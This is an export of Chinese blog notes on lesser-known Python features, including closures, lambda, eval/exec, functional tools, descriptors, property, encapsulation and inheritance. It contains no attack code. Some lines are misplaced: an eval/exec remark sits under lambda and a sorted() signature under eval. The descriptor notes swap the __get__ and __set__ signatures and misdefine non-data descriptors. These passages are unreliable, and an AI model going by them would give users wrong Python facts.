class="title">indef</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">nonlocal</span> name</span><br><span class="line">        print(name)</span><br><span class="line">        name = <span class="string">"局部函数中定义的 name 变量"</span></span><br><span class="line">    indef()</span><br><span class="line"><span class="comment"># 调用全局函数</span></span><br><span class="line">outdef()</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">所在函数中定义的 name 变量</span><br></pre></td></tr></table></figure>

<h3 id="6、闭包函数"><a href="#6、闭包函数" class="headerlink" title="6、闭包函数"></a>6、闭包函数</h3><ul>
<li>闭包，又称闭包函数或者闭合函数，和嵌套函数类似，不同之处在于，闭包中外部函数返回的不是一个具体的值，而是一个函数。（一般情况下，返回的函数会赋值给一个变量，这个变量可以在后面被继续执行调用）</li>
<li>相对于普通函数，闭包函数多了一个<code>__closuer__</code>属性，该属性记录着自由变量的地址。当闭包被调用时，系统就会根据该地址找到对应的自由变量，完成整体的函数调用，<code>__closuer__</code> 属性的类型是一个元组，这表明闭包可以支持多个自由变量的形式</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 闭包函数，其中 exponent 称为自由变量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nth_power</span><span class="params">(exponent)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exponent_of</span><span class="params">(base)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> base ** exponent</span><br><span class="line">    <span class="keyword">return</span> exponent_of  <span class="comment"># 返回值是 exponent_of 函数</span></span><br><span class="line">square = nth_power(<span class="number">2</span>)  <span class="comment"># 计算一个数的平方</span></span><br><span class="line">cube = nth_power(<span class="number">3</span>)  <span class="comment"># 计算一个数的立方</span></span><br><span class="line">print(square(<span class="number">2</span>))   <span class="comment"># 计算 2 的平方</span></span><br><span class="line">print(cube(<span class="number">2</span>))  <span class="comment"># 计算 2 的立方</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nth_power_rewrite</span><span class="params">(base, exponent)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base ** exponent</span><br><span class="line"></span><br><span class="line">base1 = base2 = base3 = <span class="number">3</span></span><br><span class="line"><span class="comment"># 不使用闭包</span></span><br><span class="line">res1 = nth_power_rewrite(base1, <span class="number">2</span>)</span><br><span class="line">res2 = nth_power_rewrite(base2, <span class="number">2</span>)</span><br><span class="line">res3 = nth_power_rewrite(base3, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># 使用闭包</span></span><br><span class="line">square = nth_power(<span class="number">2</span>)</span><br><span class="line">res1 = square(base1)</span><br><span class="line">res2 = square(base2)</span><br><span class="line">res3 = square(base3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 __closure__ 的值</span></span><br><span class="line"><span class="comment"># 是一个元组 就是 exponent 参数</span></span><br><span class="line">print(square.__closure__)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line">(&lt;cell at <span class="number">0x000001FF5B9E6B80</span>: int object at <span class="number">0x00007FFF86C416C0</span>&gt;,)</span><br></pre></td></tr></table></figure>

<h3 id="7、lambda"><a href="#7、lambda" class="headerlink" title="7、lambda"></a>7、lambda</h3><ul>
<li><p>二者不同之处在于，eval() 执行完要返回结果，而 exec() 执行完不返回结果</p>
</li>
<li><p>表达式格式如下: <code>name = lambda [list] : 表达式</code></p>
</li>
<li><p>优点</p>
<ul>
<li>对于单行函数，使用 lambda 表达式可以省去定义函数的过程，让代码更加简洁</li>
<li>对于不需要多次复用的函数，使用 lambda 表达式可以在用完之后立即释放，提高程序执行的性能</li>
</ul>
</li>
</ul>
<h3 id="8、eval-和exec"><a href="#8、eval-和exec" class="headerlink" title="8、eval()和exec()"></a>8、eval()和exec()</h3><ul>
<li>二者不同之处在于，eval() 执行完要返回结果，而 exec() 执行完不返回结果</li>
<li><code>list = sorted(iterable, key=None, reverse=False)</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eval(source, globals=<span class="literal">None</span>, locals=<span class="literal">None</span>, /)</span><br><span class="line">exec(source, globals=<span class="literal">None</span>, locals=<span class="literal">None</span>, /)</span><br><span class="line"></span><br><span class="line"><span class="comment"># expression：这个参数是一个字符串，代表要执行的语句 。该语句受后面两个字典类型参数 globals 和 locals 的限制，只有在 globals 字典和 locals 字典作用域内的函数和变量才能被执行</span></span><br><span class="line"><span class="comment"># globals：这个参数管控的是一个全局的命名空间，即 expression 可以使用全局命名空间中的函数。如果只是提供了 globals 参数，而没有提供自定义的 __builtins__，</span></span><br><span class="line"><span class="comment"># 则系统会将当前环境中的 __builtins__ 复制到自己提供的 globals 中，然后才会进行计算；如果连 globals 这个参数都没有被提供，则使用 Python 的全局命名空间</span></span><br><span class="line"><span class="comment"># locals：这个参数管控的是一个局部的命名空间，和 globals 类似，当它和 globals 中有重复或冲突时，以 locals 的为准。如果 locals 没有被提供，则默认为 globals</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意，__builtins__ 是 Python 的内建模块，平时使用的 int、str、abs 都在这个模块中。通过 print(dic["__builtins__"]) 语句可以查看 __builtins__ 所对应的 value</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数 eval() 和 exec() 常常会被黑客利用，成为可以执行系统级命令的入口点，进而来攻击网站。解决方法是：通过设置其命名空间里的可执行函数，来限制 eval() 和 exec() 的执行范围</span></span><br></pre></td></tr></table></figure>

<h3 id="9、python函数式编程"><a href="#9、python函数式编程" class="headerlink" title="9、python函数式编程"></a>9、python函数式编程</h3><ul>
<li>介绍：<ul>
<li>函数式编程，是指代码中每一块都是不可变的，都由纯函数的形式组成。这里的纯函数，是指函数本身相互独立、互不影响，对于相同的输入，总会有相同的输出</li>
<li>函数式编程的优点，主要在于其纯函数和不可变的特性使程序更加健壮，易于调试和测试；缺点主要在于限制多，难写</li>
<li>纯粹的函数式编程语言（比如 Scala），其编写的函数中是没有变量的，因此可以保证，只要输入是确定的，输出就是确定的；而允许使用变量的程序设计语言，由于函数内部的变量状态不确定，同样的输入，可能得到不同的输出</li>
<li>Python 允许使用变量，所以它并不是一门纯函数式编程语言。Python 仅对函数式编程提供了部分支持，通常与lambda 匿名函数一同使用</li>
<li>函数式编程个人认为并不是很友好的，降低代码可读性</li>
</ul>
</li>
<li>Demo(map、filter、reduce)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># map(function, iterable)</span></span><br><span class="line"><span class="comment"># function 参数表示要传入一个函数，其可以是内置函数、自定义函数或者 lambda 匿名函数 iterable 表示一个或多个可迭代对象，可以是列表、字符串等</span></span><br><span class="line"><span class="comment"># map() 函数的功能是对可迭代对象中的每个元素，都调用指定的函数，并返回一个 map 对象</span></span><br><span class="line"><span class="comment"># 函数返回的是一个 map 对象，不能直接输出，需要通过 for 循环或者 list() 函数来显示</span></span><br><span class="line">test_list = map(<span class="keyword">lambda</span> x: x**<span class="number">2</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">print(test_list)</span><br><span class="line">print(list(test_list))</span><br><span class="line"></span><br><span class="line">test_list = map(<span class="keyword">lambda</span> x, y: x + y, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">print(test_list)</span><br><span class="line">print(list(test_list))</span><br><span class="line"></span><br><span class="line">test_list = map(<span class="keyword">lambda</span> x,y: x-y &gt; <span class="number">0</span>,[<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>] )</span><br><span class="line">print(list(test_list))</span><br><span class="line"></span><br><span class="line"><span class="comment"># filter(function, iterable)</span></span><br><span class="line"><span class="comment"># funcition 参数表示要传入一个函数，iterable 表示一个可迭代对象</span></span><br><span class="line"><span class="comment"># filter() 函数的功能是对 iterable 中的每个元素，都使用 function 函数判断，并返回 True 或者 False，最后将返回 True 的元素组成一个新的可遍历的集合</span></span><br><span class="line">test_list = filter(<span class="keyword">lambda</span> x: x % <span class="number">2</span> == <span class="number">0</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">print(test_list)</span><br><span class="line">print(list(test_list))</span><br><span class="line"></span><br><span class="line"><span class="comment"># reduce(function, iterable)</span></span><br><span class="line"><span class="comment"># function 规定必须是一个包含 2 个参数的函数；iterable 表示可迭代对象</span></span><br><span class="line"><span class="comment"># 由于 reduce() 函数在 Python 3.x 中已经被移除，放入了 functools 模块，因此在使用该函数之前，需先导入 functools 模块</span></span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line">test_res = functools.reduce(<span class="keyword">lambda</span> x, y: x+y, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">print(test_res)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&lt;map object at <span class="number">0x0000025143E81160</span>&gt;</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>]</span><br><span class="line">&lt;map object at <span class="number">0x0000025143E81430</span>&gt;</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>]</span><br><span class="line">[<span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>]</span><br><span class="line">&lt;filter object at <span class="number">0x0000025143E81400</span>&gt;</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>]</span><br><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure>

<h3 id="10、python3函数注释-玩耍的功能"><a href="#10、python3函数注释-玩耍的功能" class="headerlink" title="10、python3函数注释(玩耍的功能)"></a>10、python3函数注释(玩耍的功能)</h3><ul>
<li>定义：函数注解是关于用户自定义函数使用类型的完全可选的元信息，也就是说: 为函数中的形参和返回值提供类型提示信息</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(ham:str,egg:str=<span class="string">'eggs'</span>)</span>-&gt;str:</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line">print(f.__annotations__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span><span class="params">(ham:str,egg:str=<span class="string">'eggs'</span>)</span>-&gt;"test":</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line">print(f1.__annotations__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可能会有的作用</span></span><br><span class="line"><span class="comment"># 提供类型信息：包括类型检查、让 IDE 显示函数接受和返回的类型、适配、与其他语言的桥梁、数据库查询映射、RPC参数编组等</span></span><br><span class="line"><span class="comment"># 其他信息：函数参数和返回值的文档</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&#123;'ham': &lt;class 'str'&gt;, 'egg': &lt;class 'str'&gt;, 'return': &lt;class 'str'&gt;&#125;</span><br><span class="line">&#123;'ham': &lt;class 'str'&gt;, 'egg': &lt;class 'str'&gt;, 'return': 'test'&#125;</span><br></pre></td></tr></table></figure>

<h3 id="11、浅谈代码可读性"><a href="#11、浅谈代码可读性" class="headerlink" title="11、浅谈代码可读性"></a>11、浅谈代码可读性</h3><ul>
<li>不写重复性的代码</li>
<li>学会刻意地减少代码的迭代层数，尽可能让 Python 代码扁平化</li>
<li>类不要继承太深了，超过三层建议用组合的方式</li>
<li>在使用函数时，函数的粒度应该尽可能细，不要让一个函数做太多的事情</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>奇淫</tag>
        <tag>python函数</tag>
      </tags>
  </entry>
  <entry>
    <title>python自我补充5</title>
    <url>/2020/03/10/blog_formal/%E5%BC%80%E5%8F%91/python/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A75/</url>
    <content><![CDATA[<h1 id="python-奇淫5"><a href="#python-奇淫5" class="headerlink" title="python 奇淫5"></a>python 奇淫5</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这个系列主要收录python的一些不常用知识点</p>
<a id="more"></a>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="1、为类提供文档"><a href="#1、为类提供文档" class="headerlink" title="1、为类提供文档"></a>1、为类提供文档</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">testClass</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    文档位置</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(help(testClass))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">Help on <span class="class"><span class="keyword">class</span> <span class="title">testClass</span> <span class="title">in</span> <span class="title">module</span> <span class="title">__main__</span>:</span>                                                                                                                                                                                                                           </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">testClass</span><span class="params">(builtins.object)</span></span></span><br><span class="line"><span class="class"> |  文档位置</span></span><br><span class="line"><span class="class"> |</span></span><br><span class="line"><span class="class"> |  <span class="title">Methods</span> <span class="title">defined</span> <span class="title">here</span>:</span></span><br><span class="line"> |</span><br><span class="line"> |  __init__(self)</span><br><span class="line"> |      Initialize self.  See help(type(self)) <span class="keyword">for</span> accurate signature.</span><br><span class="line"> |</span><br><span class="line"> |  ----------------------------------------------------------------------</span><br><span class="line"> |  Data descriptors defined here:</span><br><span class="line"> |</span><br><span class="line"> |  __dict__</span><br></pre></td></tr></table></figure>

<h3 id="2、self"><a href="#2、self" class="headerlink" title="2、self"></a>2、self</h3><ul>
<li>一句话: 相当于C++中的 <code>this</code> 指针</li>
</ul>
<h3 id="3、类属性和实例属性"><a href="#3、类属性和实例属性" class="headerlink" title="3、类属性和实例属性"></a>3、类属性和实例属性</h3><ul>
<li><p>类体中、所有函数之外：此范围定义的变量，称为类属性或类变量</p>
<ul>
<li>属于所有实例的共享资源，所以只要有一个实例将其修改，则全部都会被修改</li>
</ul>
</li>
<li><p>类体中，所以函数内部：以“self.变量名”的方式定义的变量，称为实例属性或实例变量</p>
<ul>
<li>类中，实例变量和类变量可以同名，这种情况下使用类对象将无法调用类变量，首选实例变量</li>
</ul>
</li>
<li><p>类体中，所有函数内部：以“变量名=变量值”的方式定义的变量，称为局部变量</p>
</li>
</ul>
<h3 id="4、实例方法、静态方法、类方法"><a href="#4、实例方法、静态方法、类方法" class="headerlink" title="4、实例方法、静态方法、类方法"></a>4、实例方法、静态方法、类方法</h3><ul>
<li><p><code>@classmethod</code> 修饰的方法为类方法</p>
<ul>
<li>类方法和实例方法相似，它最少也要包含一个参数，只不过类方法中通常将其命名为 cls，Python 会自动将类本身绑定给 cls 参数</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CLanguage</span>:</span></span><br><span class="line">    <span class="comment">#类构造方法，也属于实例方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.name = <span class="string">"C语言中文网"</span></span><br><span class="line">        self.add = <span class="string">"http://c.biancheng.net"</span></span><br><span class="line">    <span class="comment">#下面定义了一个类方法</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(cls)</span>:</span></span><br><span class="line">        print(<span class="string">"正在调用类方法"</span>,cls)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>@staticmethod</code> 修饰的方法为静态方法</p>
<ul>
<li>没有<code>cls</code>和<code>self</code></li>
</ul>
</li>
<li><p>不用任何修改的方法为实例方法</p>
<ul>
<li>通常，类中定义的方法都是实例方法，包括构造函数等</li>
</ul>
</li>
<li><p>在实际编程中，几乎不会用到类方法和静态方法，完全可以使用函数代替它们实现想要的功能，但在一些特殊的场景中（例如设计模式-工厂模式），使用类方法和静态方法也是不错的选择</p>
</li>
<li><p>类调用实例方法:</p>
<ul>
<li>类名直接调用实例方法,需要手动传递第一个<code>self</code>参数，这种方法叫做<strong>非绑定方法</strong></li>
<li>相对而言，用类的实例对象访问类成员的方法叫做<strong>绑定方法</strong></li>
</ul>
</li>
</ul>
<h3 id="5、类命名空间"><a href="#5、类命名空间" class="headerlink" title="5、类命名空间"></a>5、类命名空间</h3><ul>
<li>和类命名空间相对的是全局命名空间，即整个 Python 程序默认都位于全局命名空间中。类体则独立位于类命名空间中</li>
<li>python允许在类的命名空间中编写可执行程序(eg 输出语句、分支语句等)</li>
<li>使用类对象调用类方法时，在传参方面是和外界的函数有区别的，Python 会自动为第一个参数绑定方法的调用者，而位于全局空间中的函数，则必须显式为第一个参数传递参数</li>
</ul>
<h3 id="6、描述符"><a href="#6、描述符" class="headerlink" title="6、描述符"></a>6、描述符</h3><ul>
<li><p>本质上看，描述符就是一个类，只不过它定义了另一个类中属性的访问方式。也就是，一个类可以将属性管理全权委托给描述符类</p>
</li>
<li><p>描述符是 Python 中复杂属性访问的基础，它在内部被用于实现 property、方法、类方法、静态方法和 super 类型</p>
</li>
<li><p>描述符基于3个特殊方法</p>
<ul>
<li><p><strong>set</strong>(self, obj, type=None)：在设置属性时将调用这一方法（后续用 setter 表示）</p>
</li>
<li><p><strong>get</strong>(self, obj, value)：在读取属性时将调用这一方法（后续用 getter 表示）</p>
</li>
<li><p><strong>delete</strong>(self, obj)：对属性调用 del 时将调用这一方法（每次使用 del 类对象.属性（或者 delattr(类对象，属性)）语句时，调用该方法）</p>
</li>
<li><p>数据描述符(实现了<code>setter</code>和<code>getter</code>方法的描述符类)</p>
</li>
<li><p>非数据描述符(只实现了<code>setter</code>方法的描述符类)</p>
</li>
<li><p>每次查找属性时，都会隐式调用类对象的特殊方法<code>__getattribute__()</code>(就是每次使用<strong>类对象.属性</strong>)，顺序如下:</p>
<ul>
<li>验证该属性是否为类实例对象的数据描述符</li>
<li>如果不是，就查看该属性是否能在类实例对象的 <strong>dict</strong> 中找到</li>
<li>最后，查看该属性是否为类实例对象的非数据描述符</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#描述符类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">revealAccess</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, initval = None, name = <span class="string">'var'</span>)</span>:</span></span><br><span class="line">        self.val = initval</span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, obj, objtype)</span>:</span></span><br><span class="line">        print(<span class="string">"Retrieving"</span>,self.name)</span><br><span class="line">        <span class="keyword">return</span> self.val</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        print(<span class="string">"updating"</span>,self.name)</span><br><span class="line">        self.val = val</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myClass</span>:</span></span><br><span class="line">    x = revealAccess(<span class="number">10</span>,<span class="string">'var "x"'</span>)</span><br><span class="line">    y = <span class="number">5</span></span><br><span class="line">m = myClass()</span><br><span class="line">print(m.x)</span><br><span class="line">m.x = <span class="number">20</span></span><br><span class="line">print(m.x)</span><br><span class="line">print(m.y)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line">updating var <span class="string">"x"</span></span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<h3 id="7、property"><a href="#7、property" class="headerlink" title="7、property"></a>7、property</h3><ul>
<li><p>property() 函数的基本使用格式: <code>属性名=property(fget=None, fset=None, fdel=None, doc=None)</code></p>
</li>
<li><p>设置property函数和装饰器的变量要设置为私有变量，否则get方法还会调用自己的get方法，无限循环(另外，如果不设置成私有变量，还有什么意义，主要就是为了节省 get_xxx set_xxx del_xxx 这些函数)</p>
</li>
<li><p>@property装饰器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># @property</span></span><br><span class="line"><span class="comment"># def 方法名(self)</span></span><br><span class="line"><span class="comment">#     代码块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># @方法名.setter</span></span><br><span class="line"><span class="comment"># def 方法名(self, value):</span></span><br><span class="line"><span class="comment">#     代码块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># @方法名.deleter</span></span><br><span class="line"><span class="comment"># def 方法名(self):</span></span><br><span class="line"><span class="comment">#     代码块</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CaiXin</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, test)</span>:</span></span><br><span class="line">        self.__test = test</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.__test</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @test.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self, test)</span>:</span></span><br><span class="line">        self.__test = test</span><br><span class="line"></span><br><span class="line"><span class="meta">    @test.deleter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.__test = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">c = CaiXin(<span class="number">1</span>)</span><br><span class="line">print(c.test)</span><br><span class="line">c.test = <span class="number">2</span></span><br><span class="line">print(c.test)</span><br><span class="line"><span class="keyword">del</span> c.test</span><br><span class="line">print(c.test)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="8、封装"><a href="#8、封装" class="headerlink" title="8、封装"></a>8、封装</h3><ul>
<li>定义<ul>
<li>封装机制保证了类内部数据结构的完整性，使用类的用户无法直接看到类中的数据结构，只能使用类允许公开的数据，很好地避免了外部对内部数据的影响，提高了程序的可维护性</li>
<li>对一个类实现良好的封装，用户只能借助暴露出来的类方法来访问数据，只需要在这些暴露的方法中加入适当的控制逻辑，即可轻松实现用户对类中属性或方法的不合理操作</li>
<li>对类进行良好的封装，还可以提到代码的复用性</li>
</ul>
</li>
<li>属性<ul>
<li>public：公有属性的类变量和类函数，在类的外部、类内部以及子类，都可以访问</li>
<li>私有属性的类变量和类函数，只能在本类内部使用，类的外部以及子类都无法使用</li>
<li>默认情况下，Python 类中的变量和方法都是公有（public）的，它们的名称前都没有下划线（_）</li>
<li>如果类中的变量和函数，其名称以双下划线“__”开头，则该变量（函数）为私有变量（私有函数），其属性等同于 private</li>
</ul>
</li>
<li>封装的底层实现，其实就是改了个名字 对于以双下划线开头命名的类属性或类方法，Python 在底层实现时，将它们的名称都偷偷改成了 “_类名__属性（方法）名” 的格式，我们要人为遵守这些规定</li>
</ul>
<h3 id="9、继承"><a href="#9、继承" class="headerlink" title="9、继承"></a>9、继承</h3><ul>
<li><p>介绍：</p>
<ul>
<li>实现继承的类称为子类，被继承的类称为父类（也可称为基类、超类）</li>
<li>如果该类没有显式指定继承自哪个类，则默认继承 object 类（object 类是 Python 中所有类的父类，即要么是直接父类，要么是间接父类）</li>
<li>Python 在语法上支持多继承，但逼不得已，建议不要使用多继承(和单继承相比，多继承容易让代码逻辑复杂、思路混乱，一直备受争议，中小型项目中较少使用，后来的java、c#、php等干脆取消了多继承)</li>
</ul>
</li>
<li><p>方法解析顺序，简称MRO。对于单继承的编程语言来说，就是从当前类开始，逐个搜索它的父类。多继承就比较麻烦了</p>
<ul>
<li>从左往右，采用深度优先搜索（DFS）的算法，称为旧式类的 MRO(菱形继承会有问题)</li>
<li>自 Python 2.2 版本开始，新式类在采用深度优先搜索算法的基础上，对其做了优化(存在单调性问题)</li>
<li>自 Python 2.3 版本，对新式类采用了 C3 算法。由于 Python 3.x 仅支持新式类，所以该版本只使用 C3 算法(目前在用的)</li>
</ul>
</li>
<li><p>重写，又称覆盖，指的是对类中已有方法的内部实现进行修改</p>
</li>
<li><p>调用被重写的方法:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过类名调用实例方法的这种方式，又被称为未绑定方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"animal"</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span><span class="params">(animal)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"people"</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = people()</span><br><span class="line">p.say()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用被重写的父类函数</span></span><br><span class="line">animal.say(p)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">people</span><br><span class="line">animal</span><br></pre></td></tr></table></figure>
</li>
<li><p>继承父类可以提高开发效率，比如继承<code>dict</code>我们可以实现一个更为强大的类，比如不准修改已经存在的键值对</p>
</li>
<li><p>除了 Python 中常用的基本内置类型，collections 模块中还额外提供了很多有用的容器，这些容器可以满足大部分情况</p>
</li>
<li><p>子类的构造方法中，调用父类构造方法的方式有2种</p>
<ul>
<li>类可以看做一个独立空间，在类的外部调用其中的实例方法，可以向调用普通函数那样，只不过需要额外备注类名（此方式又称为未绑定方法）</li>
<li>使用 super() 函数。但如果涉及多继承，该函数只能调用第一个直接父类的构造方法</li>
<li>python2.x <code>super(Class, obj).__init__(self,...)</code>, 其中，Class 值得是子类的类名，obj 通常指的就是 self</li>
<li>python3.x <code>super().__init__(self,...)</code></li>
</ul>
</li>
<li><p><strong>注意：</strong>super只能在新式类中使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 旧式类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">oldStyle1</span>:</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">oldStyle2</span>:</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新式类  Python 2.x 版本中，为了向后兼容保留了旧式类。该版本中的新式类必须显式继承 object 或者其他新式类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">newStyleClass</span><span class="params">(object)</span>:</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">newStyleClass</span><span class="params">(newStyleClass)</span>:</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 Python 3.x 版本中，不再保留旧式类的概念。因此，没有继承任何其他类的类都隐式地继承自 object</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 Python 3.x 中，显式声明某个类继承自 object 似乎是冗余的。但如果考虑跨版本兼容，那么就必须将 object 作为所有基类的祖先，因为如果不这么做的话，这些类将被解释为旧式类，最终会导致难以诊断的问题</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Python 中，基类不会在<code>__init__()</code>中被隐式地调用，需要程序员显式调用它们。这种情况下，当程序中包含多重继承的类层次结构时，使用 super 是非常危险的，往往会在类的初始化过程中出现问题 </p>
</li>
</ul>
<h3 id="10、多态"><a href="#10、多态" class="headerlink" title="10、多态"></a>10、多态</h3><ul>
<li>类的多态特性，需要满足亮哥前提条件：<ul>
<li>继承：发生在子类和父类之间</li>
<li>重写：子类重写了父类的方法</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhoSay</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self,who)</span>:</span></span><br><span class="line">        who.say()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CLanguage</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"调用的是 Clanguage 类的say方法"</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CPython</span><span class="params">(CLanguage)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"调用的是 CPython 类的say方法"</span>)</span><br><span 